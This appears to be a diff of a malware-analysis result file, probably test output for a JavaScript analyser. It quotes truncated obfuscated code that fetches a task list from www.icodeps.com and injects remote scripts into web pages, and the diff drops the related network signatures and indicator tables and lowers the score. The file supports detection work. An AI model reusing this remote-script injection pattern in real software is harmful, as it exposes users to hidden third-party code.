@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 42,
+    "score": 20,
     "sections": [
       {
         "auto_collapse": false,
@@ -18,7 +18,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x6c6f=[\"log\",\"GET\",\"https://www.icodeps.com/jsapi.php\",\"parse\",\"countrycode\",\"tasklist\",\"count...\n\t\tfunction log(_0xaa32x3){if(bShouldLog){console[\"log\"](_0xaa32x3)}}(function(){$[\"ajax\"]({type:\"GET\",...\n\t\tvar _0xaa32x6=_0xaa32x5[\"countrycode\"]\n\t\tvar _0xaa32x7=_0xaa32x5[\"tasklist\"]\n\t\tlog(_0xaa32x7)\n\t\tfor(var _0xaa32x8 of _0xaa32x7){log(_0xaa32x8)\n\t\tvar _0xaa32x9=_0xaa32x8[\"countrylist\"]\n\t\tvar _0xaa32xa=_0xaa32x8[\"url\"]\n\t\tvar _0xaa32xb=_0xaa32x8[\"type\"]\n\t\tvar _0xaa32xc=_0xaa32x8[\"rand\"]\n\t\tif(_0xaa32x9[\"indexOf\"](_0xaa32x6)>  -1|| _0xaa32x9[\"indexOf\"](\"WW\")>  -1){var _0xaa32xd=parseInt(Ma...\n\t\tlog(\"randres:\"+ _0xaa32xd)\n\t\tif(_0xaa32xd== 0){if(_0xaa32xb== \"inject\"){chrome[\"runtime\"][\"SendMessage\"]({action:\"inject\",data:_0...\n\t\t_0xaa32x13[\"src\"]= _0xaa32xf\n\t\t_0xaa32x13[\"type\"]= \"text/javascript\"\n\t\t_0xaa32x13[\"async\"]= false\n\t\t_0xaa32x13[\"defer\"]= false\n\t\tif(_0xaa32x11){_0xaa32x13[\"addEventListener\"](\"load\",function(){_0xaa32x11()})}\n\t\tif(_0xaa32x12){_0xaa32x13[\"addEventListener\"](\"error\",function(){_0xaa32x11()})}\n\t\tif(_0xaa32x10){document[\"head\"][\"insertAdjacentElement\"](\"beforeend\",_0xaa32x13)}else {document[\"bod...\n\t\tconst _0xaa32x14=window[\"_vv_dev\"]?Math[\"floor\"](Math[\"random\"]()* Math[\"floor\"](99999999999999)):\"1...\n\t\tlog(_0xaa32xa+ _0xaa32x14)\n\t\t_0xaa32xe(_0xaa32xa+ \"?v=\"+ _0xaa32x14,true)})()}else {if(_0xaa32xb== \"directloadbody\"){(function(){...\n\t\t_0xaa32xe(_0xaa32xa+ \"?v=\"+ _0xaa32x14,false)})()}}}}}}}catch(e){log(e[\"name\"]+ \"\\x3A\"+ e[\"message\"]...",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x6c6f=[\"log\",\"GET\",\"https://www.icodeps.com/jsapi.php\",\"parse\",\"countrycode\",\"tasklist\",\"count...\n\t\tfunction log(_0xaa32x3){if(bShouldLog){console[\"log\"](_0xaa32x3)}}(function(){$[\"ajax\"]({type:\"GET\",...\n\t\tvar _0xaa32x6=_0xaa32x5[\"countrycode\"]\n\t\tvar _0xaa32x7=_0xaa32x5[\"tasklist\"]\n\t\tlog(_0xaa32x7)\n\t\tfor(var _0xaa32x8 of _0xaa32x7){log(_0xaa32x8)\n\t\tvar _0xaa32x9=_0xaa32x8[\"countrylist\"]\n\t\tvar _0xaa32xa=_0xaa32x8[\"url\"]\n\t\tvar _0xaa32xb=_0xaa32x8[\"type\"]\n\t\tvar _0xaa32xc=_0xaa32x8[\"rand\"]\n\t\t[14 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -38,54 +38,6 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: ObfuscationPrefix",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"type\":\"GET\",\"url\":\"https://www.icodeps.com/jsapi.php\"})",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "ajax_network_request": 10
-          },
-          "signatures": {
-            "ajax_network_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: AJAXNetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[12].send()",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "network_request": 10
-          },
-          "signatures": {
-            "network_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: NetworkRequest",
         "zeroize_on_tag_safe": false
       },
       {
@@ -111,102 +63,6 @@
         "tags": {},
         "title_text": "Signature: ParseIntUsage",
         "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "ioc": "www.icodeps.com",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "https://www.icodeps.com/jsapi.php",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/jsapi.php",
-            "ioc_type": "uri_path"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "static": {
-              "domain": [
-                "www.icodeps.com"
-              ],
-              "uri": [
-                "https://www.icodeps.com/jsapi.php"
-              ],
-              "uri_path": [
-                "/jsapi.php"
-              ]
-            }
-          }
-        },
-        "title_text": "MalwareJail extracted the following IOCs",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "method": "get",
-            "url": "https://www.icodeps.com/jsapi.php"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "url",
-            "method"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 1,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "dynamic": {
-              "domain": [
-                "www.icodeps.com"
-              ],
-              "uri": [
-                "https://www.icodeps.com/jsapi.php"
-              ],
-              "uri_path": [
-                "/jsapi.php"
-              ]
-            }
-          }
-        },
-        "title_text": "URLs",
-        "zeroize_on_tag_safe": false
       }
     ]
   },
@@ -218,33 +74,9 @@
     "heuristics": [
       {
         "attack_ids": [],
-        "heur_id": 1,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "_0x_prefix"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "ajax_network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "network_request"
         ]
       },
       {
@@ -255,50 +87,7 @@
         ]
       }
     ],
-    "tags": {
-      "network.dynamic.domain": [
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "www.icodeps.com"
-        }
-      ],
-      "network.dynamic.uri": [
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "https://www.icodeps.com/jsapi.php"
-        }
-      ],
-      "network.dynamic.uri_path": [
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "/jsapi.php"
-        }
-      ],
-      "network.static.domain": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "www.icodeps.com"
-        }
-      ],
-      "network.static.uri": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://www.icodeps.com/jsapi.php"
-        }
-      ],
-      "network.static.uri_path": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "/jsapi.php"
-        }
-      ]
-    },
+    "tags": {},
     "temp_submission_data": {}
   }
 }
